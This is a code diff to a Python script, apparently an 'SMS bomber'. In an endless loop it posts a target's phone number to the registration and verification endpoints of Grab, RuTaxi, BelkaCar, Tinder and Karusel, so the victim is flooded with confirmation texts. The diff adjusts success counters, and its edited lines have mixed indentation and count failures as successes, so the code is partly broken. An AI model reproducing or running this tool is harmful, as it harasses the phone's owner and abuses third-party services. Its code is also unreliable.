@@ -139,8 +139,8 @@ banner()
 failed = 0
 requested = 0
 sonuc = 0
-success = int(requested) - int(failed)
-bombs = int(sonuc) + 1
+success = 0
+
 while True:
   subprocess.call("clear")
   print("=======================================================")
@@ -159,31 +159,34 @@ while True:
 
 	try:
 		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-		print('[+] Grab Requests Successful!' , success+=1)
+		print('[+] Grab Requests Successful!')
+                success+=1
 	except:
 		print('[-] Grab Requests Failed!')
-
+                success+=1
 	try:
 		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-		print('[+] RuTaxi Requests Successful!' , success+=1)
+		print('[+] RuTaxi Requests Successful!')
+                success+=1
 	except:
 		print('[-] RuTaxi Requests Failed!')
 
 	try:
 		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
-		print('[+] BelkaCar Requests Successful!' , success+=1)
+		print('[+] BelkaCar Requests Successful!')
+                success+=1
 	except:
 		print('[-] BelkaCar Requests Failed!')
 
 	try:
 		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-		print('[+] Tinder Requests Successful!' , success+=1)
+		print('[+] Tinder Requests Successful!')
 	except:
 		print('[-] Tinder Requests Failed!')
 
 	try:
 		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-		print('[+] Karusel Requests Successful!' , success+=1)
+		print('[+] Karusel Requests Successful!')
 	except:
 		print('[-] Karusel Requests Failed!')
 
